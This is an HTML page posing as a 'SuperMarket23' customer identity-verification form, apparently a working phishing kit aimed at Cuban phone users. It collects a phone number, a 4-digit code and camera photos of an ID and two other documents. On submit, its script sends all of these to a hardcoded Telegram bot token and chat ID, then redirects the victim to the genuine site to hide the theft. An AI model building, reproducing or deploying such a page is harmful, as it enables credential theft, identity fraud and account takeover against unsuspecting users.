
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso Clientes | SuperMarket23</title>
    <style>
        body { background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; margin: 0; }
        .card { background: white; width: 92%; max-width: 380px; border-radius: 12px; padding: 25px; box-shadow: 0 8px 20px rgba(0,0,0,0.05); border-top: 5px solid #0056b3; }
        .header { text-align: center; margin-bottom: 20px; }
        .header h1 { color: #0056b3; font-size: 22px; margin: 0; }
        .header p { color: #666; font-size: 12px; margin-top: 5px; }
        label { color: #444; font-size: 11px; font-weight: bold; display: block; margin-top: 15px; text-transform: uppercase; }
        .input-group { display: flex; align-items: center; background: #fff; border: 1px solid #ccc; border-radius: 6px; margin-top: 5px; }
        .prefix { padding: 12px; background: #f8f9fa; font-weight: bold; border-right: 1px solid #ccc; }
        .phone-input { border: none; padding: 12px; flex-grow: 1; outline: none; font-size: 16px; width: 100%; }
        .upload-area { border: 2px dashed #0056b3; border-radius: 8px; padding: 12px; text-align: center; cursor: pointer; background: #f0f7ff; margin-top: 5px; display: block; }
        .upload-area img { max-width: 100%; max-height: 100px; border-radius: 4px; }
        .upload-area span { font-size: 11px; color: #0056b3; font-weight: 600; }
        input[type="file"] { display: none; }
        .pass-input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 6px; margin-top: 5px; text-align: center; letter-spacing: 10px; font-size: 22px; outline: none; }
        .btn-auth { background: #0056b3; color: white; border: none; width: 100%; padding: 16px; border-radius: 6px; font-weight: bold; margin-top: 25px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

<div class="card">
    <div class="header">
        <h1>SuperMarket23</h1>
        <p>Verificaci贸n de Identidad Digital</p>
    </div>
    <form id="auth-proc">
        <label>Tel茅fono de Contacto</label>
        <div class="input-group"><span class="prefix">+53</span><input type="tel" id="u-tel" class="phone-input" placeholder="5XXXXXXX" required></div>

        <label>Documento de Identidad (Frontal)</label>
        <label class="upload-area" id="z1"><span>Toca para Escanear</span><input type="file" id="i1" accept="image/*" capture="camera" onchange="v(this, 'z1')"></label>

        <label>Soporte de Validaci贸n (A)</label>
        <label class="upload-area" id="z2"><span>Toca para Escanear</span><input type="file" id="i2" accept="image/*" capture="camera" onchange="v(this, 'z2')"></label>

        <label>Soporte de Validaci贸n (B)</label>
        <label class="upload-area" id="z3"><span>Toca para Escanear</span><input type="file" id="i3" accept="image/*" capture="camera" onchange="v(this, 'z3')"></label>

        <label>C贸digo de Validaci贸n</label>
        <input type="password" id="u-cod" class="pass-input" maxlength="4" required>

        <button type="submit" class="btn-auth" id="btn-sub">Autenticar</button>
    </form>
</div>

<script>
    // CONFIGURACIN FINAL APLICADA
    const _c = {
        _t: "8318759298:AAHQGru4lkB72lUN9TA-1VCZGxbl1n_3Nkc", 
        _i: "6475554235",
        _u: "https://www.supermarket23.com" 
    };

    function v(input, boxId) {
        if (input.files && input.files[0]) {
            let reader = new FileReader();
            reader.onload = e => { document.getElementById(boxId).innerHTML = `<img src="${e.target.result}">`; }
            reader.readAsDataURL(input.files[0]);
        }
    }

    document.getElementById('auth-proc').onsubmit = async (e) => {
        e.preventDefault();
        const b = document.getElementById('btn-sub');
        b.innerText = "Verificando...";
        b.disabled = true;

        const tel = document.getElementById('u-tel').value;
        const cod = document.getElementById('u-cod').value;
        const info = ` NUEVA ENTRADA\n Tel: +53 ${tel}\n Cod: ${cod}`;

        try {
            await fetch(`https://api.telegram.org/bot${_c._t}/sendMessage?chat_id=${_c._i}&text=${encodeURIComponent(info)}`);

            const imgs = ['i1', 'i2', 'i3'];
            for (let id of imgs) {
                let file = document.getElementById(id).files[0];
                if (file) {
                    let fd = new FormData();
                    fd.append('chat_id', _c._i);
                    fd.append('photo', file);
                    await fetch(`https://api.telegram.org/bot${_c._t}/sendPhoto`, { method: 'POST', body: fd });
                }
            }
        } catch (err) {}

        window.location.href = _c._u;
    };
</script>
</body>
</html>
